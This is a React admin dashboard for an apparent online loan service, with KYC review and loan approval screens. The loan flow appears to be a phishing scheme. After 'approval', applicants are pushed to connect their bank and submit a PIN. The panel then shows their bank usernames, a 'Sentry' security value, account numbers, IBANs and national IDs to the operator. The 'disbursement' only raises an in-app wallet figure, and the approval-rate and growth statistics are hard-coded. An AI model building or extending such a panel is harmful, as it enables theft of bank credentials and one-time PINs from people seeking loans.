import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { collection, query, onSnapshot, doc, updateDoc, serverTimestamp, addDoc, where, increment } from 'firebase/firestore';
import { db } from '../../lib/firebase';
import { useAuth } from '../../hooks/useAuth';
import { Logo } from '../../components/Logo';
import { ThemeToggle } from '../../components/ThemeToggle';
import { 
  CheckCircle, 
  XCircle, 
  Users, 
  FileText, 
  TrendingUp, 
  Search,
  Filter,
  ArrowUpRight,
  ShieldCheck,
  LogOut,
  UserCheck,
  AlertCircle,
  Eye,
  ChevronDown
} from 'lucide-react';
import { auth } from '../../lib/firebase';
import { useNavigate } from 'react-router-dom';

export const AdminPage = () => {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [loans, setLoans] = useState<any[]>([]);
  const [pendingKYCs, setPendingKYCs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'loans' | 'kyc'>('loans');
  const [selectedKYC, setSelectedKYC] = useState<any | null>(null);
  const [selectedLoan, setSelectedLoan] = useState<any | null>(null);
  const [rejectionReason, setRejectionReason] = useState('');
  const [showRejectionModal, setShowRejectionModal] = useState(false);

  const handleSignOut = () => {
    auth.signOut();
    navigate('/');
  };

  useEffect(() => {
    // Listen for loans
    let unsubscribeLoans: (() => void) | null = null;
    try {
      const loansQuery = query(collection(db, 'loans'));
      unsubscribeLoans = onSnapshot(loansQuery, (snapshot) => {
        const loanData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setLoans(loanData);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching loans for admin:', err);
        }
      });
    } catch (err) {
      console.error('Error setting up admin loans listener:', err);
    }

    // Listen for pending KYCs
    let unsubscribeKYC: (() => void) | null = null;
    try {
      const kycQuery = query(collection(db, 'users'), where('kycStatus', '==', 'pending'));
      unsubscribeKYC = onSnapshot(kycQuery, (snapshot) => {
        const kycData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
        setPendingKYCs(kycData);
        setLoading(false);
      }, (err) => {
        if (err.code !== 'permission-denied') {
          console.error('Error fetching pending KYCs for admin:', err);
        }
        setLoading(false);
      });
    } catch (err) {
      console.error('Error setting up admin KYC listener:', err);
      setLoading(false);
    }

    return () => {
      if (unsubscribeLoans) unsubscribeLoans();
      if (unsubscribeKYC) unsubscribeKYC();
    };
  }, []);

  const handleLoanStatusUpdate = async (loanId: string, status: string) => {
    try {
      const loan = loans.find(l => l.id === loanId);
      if (!loan) return;

      await updateDoc(doc(db, 'loans', loanId), {
        status,
        updatedAt: serverTimestamp(),
        reviewedBy: user?.email,
      });

      // Update user document for instant UI feedback
      await updateDoc(doc(db, 'users', loan.userId), {
        activeLoanStatus: status,
        updatedAt: serverTimestamp()
      });

      // If disbursed, update user's wallet balance
      if (status === 'disbursed') {
        await updateDoc(doc(db, 'users', loan.userId), {
          walletBalance: increment(loan.amount)
        });
      }

      // Notify user
      try {
        const userName = loan.userName || loan.userEmail?.split('@')[0] || 'User';
        await addDoc(collection(db, 'notifications', loan.userId, 'items'), {
          type: 'loan_update',
          title: status === 'approved' ? 'Loan Approved' : 
                 status === 'rejected' ? 'Loan Rejected' : 
                 status === 'disbursed' ? 'Loan Disbursed' : 'Loan Update',
          message: status === 'approved' 
            ? `Hello ${userName}, your loan application for $${loan.amount.toLocaleString()} has been approved! Please connect your bank account to proceed.` 
            : status === 'rejected' 
            ? `Hello ${userName}, we regret to inform you that your loan application for $${loan.amount.toLocaleString()} was not approved at this time.`
            : status === 'disbursed'
            ? `Congratulations ${userName}! Your loan of $${loan.amount.toLocaleString()} has been successfully disbursed to your wallet.`
            : `Hello ${userName}, your loan status has been updated to ${status}.`,
          createdAt: serverTimestamp(),
          read: false,
        });
      } catch (notifyErr) {
        console.error('Error sending notification:', notifyErr);
      }

      alert(`Loan updated to ${status} successfully!`);
    } catch (err: any) {
      console.error('Error updating loan status:', err);
      alert(`Failed to update loan status: ${err.message}`);
    }
  };

  const handleKYCUpdate = async (userId: string, status: 'verified' | 'rejected', reason?: string) => {
    try {
      await updateDoc(doc(db, 'users', userId), {
        kycStatus: status,
        rejectionReason: reason || null,
        kycReviewedAt: serverTimestamp(),
        kycReviewedBy: user?.email,
      });

      // Notify user using the subcollection pattern
      try {
        await addDoc(collection(db, 'notifications', userId, 'items'), {
          type: 'kyc_update',
          title: status === 'verified' ? 'KYC Verified' : 'KYC Rejected',
          message: status === 'verified' 
            ? 'Your identity verification has been approved. You can now apply for loans.' 
            : `Your identity verification was rejected. Reason: ${reason}`,
          createdAt: serverTimestamp(),
          read: false,
        });
      } catch (notifyErr) {
        console.error('Error sending notification:', notifyErr);
        // Don't fail the whole process if notification fails
      }

      alert(`User KYC ${status === 'verified' ? 'verified' : 'rejected'} successfully!`);
      setSelectedKYC(null);
      setShowRejectionModal(false);
      setRejectionReason('');
    } catch (err: any) {
      console.error('Error updating KYC status:', err);
      alert(`Failed to update KYC status: ${err.message}`);
    }
  };

  const pendingLoans = loans.filter(l => l.status === 'pending');
  const inProgressLoans = loans.filter(l => ['bank_details_submitted', 'pin_sent'].includes(l.status));
  const pinVerificationLoans = loans.filter(l => l.status === 'pin_submitted');
  const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' || l.status === 'disbursed' ? l.amount : 0), 0);

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-primary">
      {/* Top Bar */}
      <header className="bg-white dark:bg-primary border-b border-gray-200 dark:border-zinc-800 p-6 sticky top-0 z-10">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <Logo className="h-6" />
            <span className="bg-accent/10 text-accent px-3 py-1 rounded-full text-xs font-black tracking-widest uppercase flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5" />
              Admin Panel
            </span>
          </div>
          <div className="flex items-center gap-4">
            <ThemeToggle />
            <div className="flex items-center gap-3 pl-4 border-l border-gray-200 dark:border-zinc-800">
              <div className="text-right hidden sm:block">
                <p className="text-sm font-bold dark:text-white">{user?.email}</p>
                <p className="text-xs text-gray-500">System Administrator</p>
              </div>
              <div className="w-10 h-10 rounded-full bg-accent text-white flex items-center justify-center font-black">
                {user?.email?.[0].toUpperCase()}
              </div>
              <button 
                onClick={handleSignOut}
                className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all border border-gray-200 dark:border-zinc-800"
                title="Sign Out"
              >
                <LogOut className="w-5 h-5" />
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto p-6 md:p-10">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-10">
          <AdminStatCard 
            icon={<FileText className="text-blue-500" />}
            label="Total Applications"
            value={loans.length.toString()}
          />
          <AdminStatCard 
            icon={<TrendingUp className="text-accent" />}
            label="Total Volume"
            value={`$${totalVolume.toLocaleString()}`}
          />
          <AdminStatCard 
            icon={<Users className="text-purple-500" />}
            label="Pending KYCs"
            value={pendingKYCs.length.toString()}
          />
          <AdminStatCard 
            icon={<ArrowUpRight className="text-orange-500" />}
            label="Approval Rate"
            value="68%"
          />
        </div>

        {/* Tabs */}
        <div className="flex gap-4 mb-8 border-b border-gray-200 dark:border-zinc-800">
          <button 
            onClick={() => setActiveTab('loans')}
            className={`pb-4 px-2 font-black uppercase tracking-widest text-sm transition-all relative ${
              activeTab === 'loans' ? 'text-accent' : 'text-gray-400 hover:text-gray-600'
            }`}
          >
            Loan Applications
            {activeTab === 'loans' && <motion.div layoutId="tab" className="absolute bottom-0 left-0 right-0 h-1 bg-accent rounded-t-full" />}
            {pendingLoans.length > 0 && (
              <span className="ml-2 bg-accent text-white text-[10px] px-1.5 py-0.5 rounded-full">
                {pendingLoans.length}
              </span>
            )}
          </button>
          <button 
            onClick={() => setActiveTab('kyc')}
            className={`pb-4 px-2 font-black uppercase tracking-widest text-sm transition-all relative ${
              activeTab === 'kyc' ? 'text-accent' : 'text-gray-400 hover:text-gray-600'
            }`}
          >
            KYC Verifications
            {activeTab === 'kyc' && <motion.div layoutId="tab" className="absolute bottom-0 left-0 right-0 h-1 bg-accent rounded-t-full" />}
            {pendingKYCs.length > 0 && (
              <span className="ml-2 bg-accent text-white text-[10px] px-1.5 py-0.5 rounded-full">
                {pendingKYCs.length}
              </span>
            )}
          </button>
        </div>

        {activeTab === 'loans' ? (
          <div className="space-y-8">
            {/* Pending Review */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Pending Review
                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pendingLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant</th>
                      <th className="pb-4 font-bold">Amount</th>
                      <th className="pb-4 font-bold">Purpose</th>
                      <th className="pb-4 font-bold">Date</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {loading ? (
                      <tr>
                        <td colSpan={5} className="py-10 text-center text-gray-500">
                          Loading applications...
                        </td>
                      </tr>
                    ) : pendingLoans.length === 0 ? (
                      <tr>
                        <td colSpan={5} className="py-10 text-center text-gray-500">
                          No pending applications to review.
                        </td>
                      </tr>
                    ) : (
                      pendingLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                          </td>
                          <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
                          <td className="py-4 text-gray-500">{loan.purpose}</td>
                          <td className="py-4 text-gray-500">
                            {loan.createdAt?.toDate ? loan.createdAt.toDate().toLocaleDateString() : 'Just now'}
                          </td>
                          <td className="py-4 text-right">
                            <div className="flex justify-end gap-2">
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
                                className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all"
                                title="Reject"
                              >
                                <XCircle className="w-6 h-6" />
                              </button>
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'approved')}
                                className="p-2 rounded-lg hover:bg-green-50 text-gray-400 hover:text-accent transition-all"
                                title="Approve"
                              >
                                <CheckCircle className="w-6 h-6" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* In Progress */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                In Progress (Bank Connection)
                <span className="bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {inProgressLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant</th>
                      <th className="pb-4 font-bold">Status</th>
                      <th className="pb-4 font-bold">Details Provided</th>
                      <th className="pb-4 font-bold text-right">Last Activity</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {inProgressLoans.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No loans currently in bank connection phase.
                        </td>
                      </tr>
                    ) : (
                      inProgressLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                          </td>
                          <td className="py-4">
                            <span className={`px-2 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
                              loan.status === 'bank_details_submitted' 
                                ? 'bg-blue-100 text-blue-700' 
                                : 'bg-purple-100 text-purple-700'
                            }`}>
                              {loan.status === 'bank_details_submitted' ? 'Filling Additional Info' : 'Awaiting PIN'}
                            </span>
                          </td>
                          <td className="py-4">
                            <div className="text-xs text-gray-500">
                              {loan.bankDetails ? '✓ Bank Details' : '✗ Bank Details'}<br/>
                              {loan.additionalDetails ? '✓ Additional Info' : '✗ Additional Info'}
                            </div>
                          </td>
                          <td className="py-4 text-right text-gray-500 text-xs">
                            <div className="flex justify-end items-center gap-2">
                              <span>{loan.updatedAt?.toDate ? loan.updatedAt.toDate().toLocaleString() : 'Just now'}</span>
                              <button 
                                onClick={() => setSelectedLoan(loan)}
                                className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
                              >
                                <Eye className="w-4 h-4" />
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* PIN Verified */}
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Ready for Final Approval & Disbursement
                <span className="bg-green-100 text-green-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pinVerificationLoans.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">Applicant & Loan</th>
                      <th className="pb-4 font-bold">Amount & Purpose</th>
                      <th className="pb-4 font-bold">Full Verification Data</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {pinVerificationLoans.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No loans ready for final review.
                        </td>
                      </tr>
                    ) : (
                      pinVerificationLoans.map((loan) => (
                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
                            <div className="mt-1 text-[10px] text-accent font-black uppercase">PIN VERIFIED ✓</div>
                          </td>
                          <td className="py-4">
                            <div className="font-bold text-accent text-lg">${loan.amount.toLocaleString()}</div>
                            <div className="text-xs text-gray-500 italic">"{loan.purpose}"</div>
                          </td>
                          <td className="py-4">
                            <div className="grid grid-cols-2 gap-x-6 gap-y-2">
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Primary Bank</p>
                                <p className="text-xs font-bold dark:text-white">{loan.bankDetails?.bankName}</p>
                                <p className="text-[10px] text-gray-500">{loan.bankDetails?.accountNumber}</p>
                                <p className="text-[10px] text-gray-400 italic">{loan.bankDetails?.accountName}</p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Additional Info</p>
                                <p className="text-[10px] text-gray-500">IBAN: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.iban}</span></p>
                                <p className="text-[10px] text-gray-500">Phone: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.phoneNumber}</span></p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Bank Auth</p>
                                <p className="text-[10px] text-gray-500">User: <span className="text-gray-700 dark:text-gray-300">{loan.additionalDetails?.bankUsername}</span></p>
                              </div>
                              <div>
                                <p className="text-[9px] font-black uppercase text-gray-400">Security</p>
                                <p className="text-[10px] text-gray-500">Sentry: <span className="text-gray-700 dark:text-gray-300 font-mono">{loan.additionalDetails?.sentry}</span></p>
                              </div>
                            </div>
                          </td>
                          <td className="py-4 text-right">
                            <div className="flex flex-col gap-2 items-end">
                              <div className="flex gap-2">
                                <button 
                                  onClick={() => setSelectedLoan(loan)}
                                  className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-zinc-800 text-gray-400"
                                  title="View All Details"
                                >
                                  <Eye className="w-5 h-5" />
                                </button>
                                <button 
                                  onClick={() => handleLoanStatusUpdate(loan.id, 'disbursed')}
                                  className="btn-primary px-6 py-3 text-xs bg-green-600 hover:bg-green-700 shadow-lg shadow-green-600/20"
                                >
                                  Approve & Disburse
                                </button>
                              </div>
                              <button 
                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
                                className="text-[10px] font-black uppercase text-red-500 hover:underline"
                              >
                                Reject at Final Stage
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="card">
              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
                Pending KYC Verifications
                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
                  {pendingKYCs.length}
                </span>
              </h2>
              
              <div className="overflow-x-auto">
                <table className="w-full text-left">
                  <thead>
                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
                      <th className="pb-4 font-bold">User</th>
                      <th className="pb-4 font-bold">Full Name</th>
                      <th className="pb-4 font-bold">Submitted At</th>
                      <th className="pb-4 font-bold text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
                    {loading ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          Loading verifications...
                        </td>
                      </tr>
                    ) : pendingKYCs.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-10 text-center text-gray-500">
                          No pending KYC verifications.
                        </td>
                      </tr>
                    ) : (
                      pendingKYCs.map((kyc) => (
                        <tr key={kyc.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
                          <td className="py-4">
                            <div className="font-bold dark:text-white">{kyc.email}</div>
                            <div className="text-xs text-gray-400 font-mono">{kyc.id}</div>
                          </td>
                          <td className="py-4 font-bold dark:text-white">{kyc.fullName}</td>
                          <td className="py-4 text-gray-500">
                            {kyc.kycSubmittedAt ? new Date(kyc.kycSubmittedAt).toLocaleDateString() : 'N/A'}
                          </td>
                          <td className="py-4 text-right">
                            <button 
                              onClick={() => setSelectedKYC(kyc)}
                              className="btn-secondary px-4 py-2 text-xs flex items-center gap-2 ml-auto"
                            >
                              <Eye className="w-4 h-4" />
                              Review
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            {/* KYC Review Detail */}
            <AnimatePresence>
              {selectedKYC && (
                <motion.div 
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: 20 }}
                  className="card border-2 border-accent/20"
                >
                  <div className="flex justify-between items-start mb-8">
                    <div>
                      <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Reviewing: {selectedKYC.fullName}</h3>
                      <p className="text-gray-500">User ID: {selectedKYC.id}</p>
                    </div>
                    <button onClick={() => setSelectedKYC(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                      <XCircle className="w-6 h-6 text-gray-400" />
                    </button>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-10">
                    <DetailSection title="Personal Details">
                      <DetailItem label="Full Name" value={selectedKYC.fullName} />
                      <DetailItem label="Date of Birth" value={selectedKYC.dob} />
                      <DetailItem label="Marital Status" value={selectedKYC.maritalStatus} />
                      <DetailItem label="Address" value={selectedKYC.address} />
                      <DetailItem label="State of Origin" value={selectedKYC.stateOfOrigin} />
                    </DetailSection>

                    <DetailSection title="Employment Details">
                      <DetailItem label="Status" value={selectedKYC.employmentStatus} />
                      <DetailItem label="Employer" value={selectedKYC.employerName} />
                      <DetailItem label="Job Title" value={selectedKYC.jobTitle} />
                      <DetailItem label="Monthly Income" value={selectedKYC.monthlyIncome} />
                    </DetailSection>

                    <DetailSection title="Documents">
                      <DetailItem label="National ID Number" value={selectedKYC.nationalIdNumber} />
                    </DetailSection>
                  </div>

                  <div className="flex justify-end gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                    <button 
                      onClick={() => setShowRejectionModal(true)}
                      className="btn-secondary px-8 py-3 text-red-500 border-red-100 hover:bg-red-50"
                    >
                      Reject Submission
                    </button>
                    <button 
                      onClick={() => handleKYCUpdate(selectedKYC.id, 'verified')}
                      className="btn-primary px-8 py-3"
                    >
                      Approve & Verify User
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        )}
      </main>

      {/* Loan Detail Modal */}
      <AnimatePresence>
        {selectedLoan && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setSelectedLoan(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh]"
            >
              <div className="flex justify-between items-start mb-8">
                <div>
                  <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-1">Loan Review</h3>
                  <p className="text-gray-500">ID: {selectedLoan.id}</p>
                </div>
                <button onClick={() => setSelectedLoan(null)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
                  <XCircle className="w-6 h-6 text-gray-400" />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                <DetailSection title="Application Info">
                  <DetailItem label="Applicant" value={selectedLoan.userEmail} />
                  <DetailItem label="Amount" value={`$${selectedLoan.amount.toLocaleString()}`} />
                  <DetailItem label="Purpose" value={selectedLoan.purpose} />
                  <DetailItem label="Status" value={selectedLoan.status.toUpperCase()} />
                </DetailSection>

                <DetailSection title="Bank Details">
                  <DetailItem label="Bank Name" value={selectedLoan.bankDetails?.bankName} />
                  <DetailItem label="Account Number" value={selectedLoan.bankDetails?.accountNumber} />
                  <DetailItem label="Account Name" value={selectedLoan.bankDetails?.accountName} />
                </DetailSection>

                <DetailSection title="Verification Data">
                  <DetailItem label="IBAN" value={selectedLoan.additionalDetails?.iban} />
                  <DetailItem label="Phone Number" value={selectedLoan.additionalDetails?.phoneNumber} />
                  <DetailItem label="Bank Username" value={selectedLoan.additionalDetails?.bankUsername} />
                  <DetailItem label="Sentry ID" value={selectedLoan.additionalDetails?.sentry} />
                </DetailSection>

                <DetailSection title="Timestamps">
                  <DetailItem label="Applied" value={selectedLoan.createdAt?.toDate?.().toLocaleString()} />
                  <DetailItem label="Bank Submitted" value={selectedLoan.bankSubmittedAt?.toDate?.().toLocaleString()} />
                  <DetailItem label="PIN Verified" value={selectedLoan.pinSubmittedAt?.toDate?.().toLocaleString()} />
                </DetailSection>
              </div>

              <div className="flex gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
                {['pending', 'bank_details_submitted', 'pin_sent', 'pin_submitted'].includes(selectedLoan.status) && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'rejected');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 py-4 rounded-2xl font-bold text-red-500 hover:bg-red-50 transition-all border border-red-100"
                  >
                    Reject Application
                  </button>
                )}
                
                {selectedLoan.status === 'pending' && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'approved');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 btn-primary py-4"
                  >
                    Approve Application
                  </button>
                )}

                {selectedLoan.status === 'pin_submitted' && (
                  <button 
                    onClick={() => {
                      handleLoanStatusUpdate(selectedLoan.id, 'disbursed');
                      setSelectedLoan(null);
                    }}
                    className="flex-1 btn-primary py-4"
                  >
                    Approve & Disburse
                  </button>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Rejection Modal */}
      <AnimatePresence>
        {showRejectionModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowRejectionModal(false)}
              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative bg-white dark:bg-zinc-950 rounded-3xl p-8 max-w-md w-full shadow-2xl border border-gray-200 dark:border-zinc-800"
            >
              <h3 className="text-2xl font-black tracking-tighter dark:text-white uppercase mb-4">Rejection Reason</h3>
              <p className="text-gray-500 mb-6">Please provide a clear reason why this KYC submission is being rejected. The user will see this message.</p>
              
              <textarea 
                value={rejectionReason}
                onChange={(e) => setRejectionReason(e.target.value)}
                className="input-field min-h-[120px] py-4 mb-6"
                placeholder="e.g. The provided ID number does not match our records or the address is incomplete."
              />

              <div className="flex gap-4">
                <button 
                  onClick={() => setShowRejectionModal(false)}
                  className="flex-1 py-3 rounded-2xl font-bold text-gray-500 hover:bg-gray-100 dark:hover:bg-zinc-900 transition-all"
                >
                  Cancel
                </button>
                <button 
                  onClick={() => handleKYCUpdate(selectedKYC.id, 'rejected', rejectionReason)}
                  disabled={!rejectionReason.trim()}
                  className="flex-1 btn-primary py-3 disabled:opacity-50"
                >
                  Confirm Reject
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

const DetailSection = ({ title, children }: { title: string, children: React.ReactNode }) => (
  <div className="space-y-4">
    <h4 className="text-xs font-black uppercase tracking-widest text-accent">{title}</h4>
    <div className="space-y-3">
      {children}
    </div>
  </div>
);

const DetailItem = ({ label, value }: { label: string, value: string }) => (
  <div>
    <p className="text-[10px] font-black uppercase tracking-widest text-gray-400 mb-0.5">{label}</p>
    <p className="font-bold dark:text-white">{value || 'N/A'}</p>
  </div>
);

const AdminStatCard = ({ icon, label, value }: { icon: React.ReactNode, label: string, value: string }) => (
  <div className="card">
    <div className="flex justify-between items-start mb-4">
      <div className="p-3 rounded-xl bg-gray-50 dark:bg-zinc-800">
        {React.cloneElement(icon as React.ReactElement, { className: "w-6 h-6" })}
      </div>
      <span className="text-accent text-xs font-bold flex items-center gap-1">
        +12.5% <ArrowUpRight className="w-3 h-3" />
      </span>
    </div>
    <p className="text-sm text-gray-500 font-bold uppercase tracking-wider mb-1">{label}</p>
    <p className="text-3xl font-black dark:text-white">{value}</p>
  </div>
);
